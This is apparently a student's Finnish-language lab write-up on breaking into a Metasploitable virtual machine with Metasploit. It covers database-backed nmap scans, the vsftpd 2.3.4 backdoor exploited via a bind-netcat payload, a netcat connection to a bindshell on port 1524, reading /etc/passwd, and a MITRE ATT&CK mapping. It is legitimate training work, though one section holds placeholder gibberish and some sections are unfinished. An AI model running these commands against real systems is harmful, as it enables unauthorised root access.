## x) Lue/katso/kuuntele ja tiivistä

jgpoewjngp

gmoewp

## b) Tallenna porttiskannauksen tuloksia Metasploitin tietokantoihin

Aloitin tehtävän `sudo msfdb init` komennolla, jonka jälkeen käynnistin `sudo msfconsole`.

<img width="631" height="406" alt="b)" src="https://github.com/user-attachments/assets/2ec517c4-32cb-461a-8f71-aabaabe41fa2" />

Tarkistin yhteyden tietokantaan `db_status`.

<img width="423" height="35" alt="b)2" src="https://github.com/user-attachments/assets/6cdac760-9da0-4fae-bb16-5f7ed1af1be3" />

Yhteys toimi.

Ajoin ensin komennon `db_nmap -sV localhost`, ja tämän jälkeen `db_nmap -sV -T4 192.168.56.101`

<img width="872" height="330" alt="b)3" src="https://github.com/user-attachments/assets/7b56e871-1686-4515-985d-fd45a5590636" />

<img width="872" height="330" alt="b)3" src="https://github.com/user-attachments/assets/a49a3d93-04d7-4d54-a602-d1ea0cccce6e" />

## c) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services".

`hosts`

<img width="746" height="157" alt="c)" src="https://github.com/user-attachments/assets/758a39de-59c9-41fb-ba1e-215cf6a74d86" />

`services`

<img width="902" height="491" alt="c)2" src="https://github.com/user-attachments/assets/8ee1813a-73e2-408e-ad9e-ff47127e167c" />

Tehtävässä piti vielä suodattaa tai hakea listoista.

Hain hosts listasta `-S Linux`

<img width="770" height="143" alt="c)3" src="https://github.com/user-attachments/assets/75441597-b434-4b4b-a2fd-dd2a36ff49dc" />

Ja service listasta suodatin tiettyyn porttiin `-p 1524`

<img width="766" height="123" alt="c)4" src="https://github.com/user-attachments/assets/c80df9e9-03cc-4428-acb3-4e270d061ad9" />

## d) Internet famous

Otin tähän vsftpd 2.3.4 backdoorin, jossa tahallinen backdoor lisättiin .tar.gz arkistoon. Tämä mahdollistaa root shellin avaamisen lisäämällä `:)` FTP-käyttäjätunnuksen loppuun.

## e) Vertaile nmap:n omaa tiedostoon tallennusta (-oA foo) ja db_nmap:n tallennusta tietokantoihin

nmap -oA foo

- Tallentaa tiedon kolmeen tiedostoon: foo.nmap, foo.xml ja foo.gnmap
- Pysyvät vaikka Metasploit suljetaan
- Voidaan avata millä tahansa tekstieditorilla

db_nmap

- Tulokset tallentuvat automaattisesti PostgreSQL-tietokantaan
- Voidaan hakea ja suodattaa suoraan Metasploitissa

## f) Murtaudu Metasploitablen vsftpd-palveluun

Ajoin komennon `search vsftpd` komennon.

<img width="925" height="238" alt="f)" src="https://github.com/user-attachments/assets/b67bab40-a42f-4da7-8416-91ffac81ed55" />

Valitsin kohdan 1, koska sen rank oli excellent. `use 1`

<img width="600" height="64" alt="f)2" src="https://github.com/user-attachments/assets/0ee7da0f-3459-45de-a74d-909be5a9d226" />

Seuraavaksi komento `set RHOSTS 192.168.56.101`

<img width="582" height="33" alt="f)3" src="https://github.com/user-attachments/assets/248db034-daae-494f-bf25-33f64e55cc67" />

Käynnistäminen ei toiminutkaan, komento jolla sain exploitin toimimaan oli `set PAYLOAD cmd/unix/bind_netcat`

<img width="619" height="39" alt="f)4" src="https://github.com/user-attachments/assets/010564c0-d8cd-454f-82d4-1924ff01e021" />

Tämän jälkeen `exploit` toimi ja shell avautui.

<img width="956" height="264" alt="f)5" src="https://github.com/user-attachments/assets/92af6fef-e065-4046-8bfb-e24724d69dd4" />

Tarkistus.

<img width="201" height="93" alt="f)6" src="https://github.com/user-attachments/assets/75d75065-a2f4-475b-8857-b129f9ed02e4" />

## g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta

`ifconfig`

<img width="626" height="316" alt="g)" src="https://github.com/user-attachments/assets/06c568ae-1a10-41fd-8a5e-3b16edc12685" />

Seuraavaksi katsoin `cat /etc/passwd`

<img width="624" height="596" alt="g)2" src="https://github.com/user-attachments/assets/607fd194-4c54-46fe-af1a-e2d22d3b3004" />

Näkyi suoraan pääkäyttäjä root. Näkyvillä olevia tunnuksia voidaan yrittää, kun murretaan salasanoja.

## h) Murtaudu Metasploitableen jollain toisella tavalla

Aiemmassa porttiskannauksessa huomattu portti 1524. Tähän murtauduin komennolla `nc 192.168.56.101 1524`

<img width="260" height="91" alt="h)" src="https://github.com/user-attachments/assets/7a5882b8-20c6-4c57-9a16-3b5522b97bed" />

## i) Demonstroi Meterpretrin ominaisuuksia.

## j) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt) tai tmux:lla

Toisessa terminaalissa ajoin komennon `script -fa log001.txt` ollessani msfconsolen sisällä. Toisessa tein kohdan f) uudestaan ja kun olin valmis poistun komennolla `exit`

Tarkistin oliko tallennus toiminut.

<img width="894" height="56" alt="j)" src="https://github.com/user-attachments/assets/1795e7a9-3822-415e-b3c1-eb94ef76b055" />

## k) Pivot point. Laita kaikki harjoituksen tiedostot (script -fa, nmap -oA...) samaan kansioon

Loin kansion `mkdir tehtava` ja siirsin tiedostot sinne.

## l) Attaaack! Mitä Mitre Attack taktiikoita ja tekniikoita käytit tässä harjoituksessa?

`db_nmap -sV`
- Taktiikka: Reconnaissance
- Tekniikka: Active Scanning

